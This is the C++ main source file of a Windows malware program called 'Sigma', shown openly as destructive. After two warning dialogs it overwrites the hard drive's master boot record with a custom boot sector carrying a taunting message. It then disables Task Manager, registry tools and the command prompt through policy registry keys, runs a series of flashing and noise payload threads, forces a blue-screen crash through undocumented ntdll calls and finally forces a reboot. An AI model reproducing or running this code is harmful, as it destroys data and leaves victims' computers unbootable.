#include "stuff.h"

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
	if (MessageBoxW(0, L"You are about to run a malware.\n\n\
Use this malware wisely, this will cause data loss and makes your computer likely unbootable.\n\
If you don't know what is this program do, just click 'No' to keep your computer safe.\n\
When clicking 'Yes', the malware will start and you'll understand the risk. If you want to\n\
try this, then use a secure environment, like a Virtual Machine.\n\
The creator is not responsible for any data loss or damage made to your computer.\n\
Do you want to execute this malware? You won't be able to use Windows again!\n\n\
WARNING: This malware contains flashing lights and disturbing noises.", L"Sigma", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
		ExitProcess(0);
	}

	if (MessageBoxW(0, L"FINAL WARNING!\n\n\
If you have read the previous warning, then you'll keep in mind that your\n\
computer is going to be destroyed. Clicking 'Yes' destroys your computer!\n\
You won't be able to use Windows again!\n\
The creator is not responsible for any data loss or damage made to your computer.\n\n\
Do you still wanna execute this malware?", L"Sigma", MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES) {
		ExitProcess(0);
	}

	unsigned char MBRData[] = {
		0xB4, 0x07, 0xB0, 0x00, 0xB6, 0x18, 0xB2, 0x50, 0xCD, 0x10, 0xB4, 0x01, 0xB9, 0x07, 0x26, 0xCD,
		0x10, 0xB4, 0x00, 0xB0, 0x13, 0xCD, 0x10, 0xBE, 0x3A, 0x7C, 0xB1, 0x28, 0xB4, 0x0E, 0x8A, 0x04,
		0xB7, 0x00, 0x88, 0xCB, 0xCD, 0x10, 0xAC, 0xF4, 0xFE, 0xC1, 0x80, 0xF9, 0x37, 0x74, 0x07, 0x3C,
		0x00, 0x75, 0xE9, 0xF4, 0xEB, 0xFD, 0xB1, 0x20, 0xEB, 0xE2, 0x59, 0x6F, 0x75, 0x20, 0x6A, 0x75,
		0x73, 0x74, 0x20, 0x62, 0x65, 0x63, 0x61, 0x6D, 0x65, 0x20, 0x61, 0x20, 0x76, 0x69, 0x63, 0x74,
		0x69, 0x6D, 0x20, 0x6F, 0x66, 0x20, 0x53, 0x69, 0x67, 0x6D, 0x61, 0x2E, 0x0D, 0x0A, 0x0D, 0x0A,
		0x45, 0x6E, 0x6A, 0x6F, 0x79, 0x20, 0x74, 0x68, 0x65, 0x20, 0x68, 0x65, 0x6C, 0x6C, 0x2E, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
	};

	DWORD bytes;
	HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);

	if (drive == INVALID_HANDLE_VALUE) {
		MessageBoxW(0, L"Failed to open hard drive.", L"Error", MB_OK | MB_ICONERROR);
		CloseHandle(drive);
		ExitProcess(0);
	}

	if (!WriteFile(drive, MBRData, 512, &bytes, 0)) {
		MessageBoxW(0, L"Failed to overwrite bootloader.", L"Error", MB_OK | MB_ICONERROR);
		CloseHandle(drive);
		ExitProcess(0);
	}

	CloseHandle(drive);

	HKEY key;
	LONG reg;
	DWORD RegData = 1;

	reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &key, 0);
	reg = RegSetValueExW(key, L"DisableTaskMgr", 0, REG_DWORD, (LPBYTE)&RegData, sizeof(RegData));
	reg = RegSetValueExW(key, L"DisableRegistryTools", 0, REG_DWORD, (LPBYTE)&RegData, sizeof(RegData));

	reg = RegCreateKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, 0, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0, &key, 0);
	reg = RegSetValueExW(key, L"DisableCMD", 0, REG_DWORD, (LPBYTE)&RegData, sizeof(RegData));

	RegCloseKey(key);

	Sleep(5000);

	Payloads PayloadList[7][4] = {
		{ (DWORD)Payload1, (DWORD)PostPayload1, (DWORD)Sound1, 20 },
		{ (DWORD)Payload2, 0, (DWORD)Sound2, 10 },
		{ (DWORD)Payload3, 0, (DWORD)Sound3, 20 },
		{ (DWORD)Payload4, 0, (DWORD)Sound4, 14 },
		{ (DWORD)Payload5, (DWORD)PostPayload5, (DWORD)Sound5, 18 },
		{ (DWORD)Payload6, (DWORD)PostPayload6, (DWORD)Sound6, 14 },
		{ (DWORD)Payload7, 0, (DWORD)Sound7, 12 }
	};

	HANDLE captions = 0;
	HANDLE files = 0;

	for (int Payload = 0; Payload < 7; Payload++) {
		HANDLE payload = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PayloadList[Payload]->payload, &PayloadList[Payload], 0, 0);
		HANDLE postPayload = 0;

		if (PayloadList[Payload]->postPayload != 0) {
			postPayload = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PayloadList[Payload]->postPayload, &PayloadList[Payload], 0, 0);
		}

		HANDLE sound = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)PayloadList[Payload]->sound, &PayloadList[Payload], 0, 0);

		if (Payload == 1) {
			captions = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WindowCaptions, 0, 0, 0);
			files = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)OpenFiles, 0, 0, 0);
		}

		Sleep(PayloadList[Payload]->time * 1000);

		CloseHandle(payload);
		CloseHandle(postPayload);
		CloseHandle(sound);

		RedrawWindow(0, 0, 0, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	}

	CloseHandle(captions);
	CloseHandle(files);

	BOOLEAN enable;
	ULONG response;

	FARPROC enRtl = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "RtlAdjustPrivilege");
	FARPROC enNt = GetProcAddress(LoadLibraryW(L"ntdll.dll"), "NtRaiseHardError");
	RtlAP RtlAdjustPrivilege = (RtlAP)enRtl;
	NtRHE NtRaiseHardError = (NtRHE)enNt;

	RtlAdjustPrivilege(19, true, false, &enable);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

	HANDLE token;
	TOKEN_PRIVILEGES priv;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValueW(0, SE_SHUTDOWN_NAME, &priv.Privileges[0].Luid);

	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, 0, &priv, 0, 0, 0);

	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_HOTFIX);

	Sleep(INFINITE);
}